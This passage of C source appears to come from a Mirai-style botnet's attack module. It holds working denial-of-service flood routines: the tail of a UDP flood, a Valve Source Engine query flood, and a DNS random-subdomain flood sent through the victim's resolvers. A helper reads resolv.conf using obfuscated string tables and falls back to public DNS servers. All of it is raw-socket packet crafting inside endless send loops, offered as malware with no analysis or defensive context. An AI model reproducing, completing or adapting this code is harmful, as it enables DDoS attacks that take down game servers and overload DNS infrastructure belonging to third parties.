            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + udpkick_payload_len + data_len);
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + udpkick_payload_len + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}

void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
    char *vse_payload;
    int vse_payload_len;

    table_unlock_val(TABLE_ATK_VSE);
    vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + 4 + vse_payload_len);

        *((uint32_t *)data) = 0xffffffff;
        data += sizeof (uint32_t);
        util_memcpy(data, vse_payload, vse_payload_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            
            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);

            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}
void attack_method_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 53);
    uint16_t dns_hdr_id = attack_get_opt_int(opts_len, opts, ATK_OPT_DNS_HDR_ID, 0xffff);
    uint8_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    int domain_len;
    ipv4_t dns_resolver = get_dns_resolver();
    if (domain == NULL)
    {
        return;
    }
    domain_len = util_strlen(domain);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        int ii;
        uint8_t curr_word_len = 0, num_words = 0;
        struct iphdr *iph;
        struct udphdr *udph;
        struct dnshdr *dnsh;
        char *qname, *curr_lbl;
        struct dns_question *dnst;
        pkts[i] = calloc(600, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        dnsh = (struct dnshdr *)(udph + 1);
        qname = (char *)(dnsh + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
        iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = dns_resolver;
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
        dnsh->id = htons(dns_hdr_id);
        dnsh->opts = htons(1 << 8);
        dnsh->qdcount = htons(1);
        *qname++ = data_len;
        qname += data_len;
        curr_lbl = qname;
        util_memcpy(qname + 1, domain, domain_len + 1);
        for (ii = 0; ii < domain_len; ii++)
        {
            if (domain[ii] == '.')
            {
                *curr_lbl = curr_word_len;
                curr_word_len = 0;
                num_words++;
                curr_lbl = qname + ii + 1;
            }
            else
                curr_word_len++;
        }
        *curr_lbl = curr_word_len;
        dnst = (struct dns_question *)(qname + domain_len + 2);
        dnst->qtype = htons(PROTO_DNS_QTYPE_A);
        dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            struct dnshdr *dnsh = (struct dnshdr *)(udph + 1);
            char *qrand = ((char *)(dnsh + 1)) + 1;
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;
            if (dns_hdr_id == 0xffff)
                dnsh->id = rand_next() & 0xffff;
            rand_alpha_str((uint8_t *)qrand, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
            targs[i].sock_addr.sin_addr.s_addr = dns_resolver;
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}

static ipv4_t get_dns_resolver(void)
{
    int fd;
    table_unlock_val(TABLE_ATK_RESOLVER);
    fd = open(table_retrieve_val(TABLE_ATK_RESOLVER, NULL), O_RDONLY);
    table_lock_val(TABLE_ATK_RESOLVER);
    if (fd >= 0)
    {
        int ret, nspos;
        char resolvbuf[2048];
        ret = read(fd, resolvbuf, sizeof (resolvbuf));
        close(fd);
        table_unlock_val(TABLE_ATK_NSERV);
        nspos = util_stristr(resolvbuf, ret, table_retrieve_val(TABLE_ATK_NSERV, NULL));
        table_lock_val(TABLE_ATK_NSERV);
        if (nspos != -1)
        {
            int i;
            char ipbuf[32];
            BOOL finished_whitespace = FALSE;
            BOOL found = FALSE;
            for (i = nspos; i < ret; i++)
            {
                char c = resolvbuf[i];
                if (!finished_whitespace)
                {
                    if (c == ' ' || c == '\t')
                        continue;
                    else
                        finished_whitespace = TRUE;
                }
                if ((c != '.' && (c < '0' || c > '9')) || (i == (ret - 1)))
                {
                    util_memcpy(ipbuf, resolvbuf + nspos, i - nspos);
                    ipbuf[i - nspos] = 0;
                    found = TRUE;
                    break;
                }
            }
            if (found)
            {
                return inet_addr(ipbuf);
            }
        }
    }
    switch (rand_next() % 4)
    {
    case 0:
        return INET_ADDR(8,8,8,8);
    case 1:
        return INET_ADDR(74,82,42,42);
    case 2:
        return INET_ADDR(64,6,64,6);
    case 3:
        return INET_ADDR(4,2,2,2);
    }
}
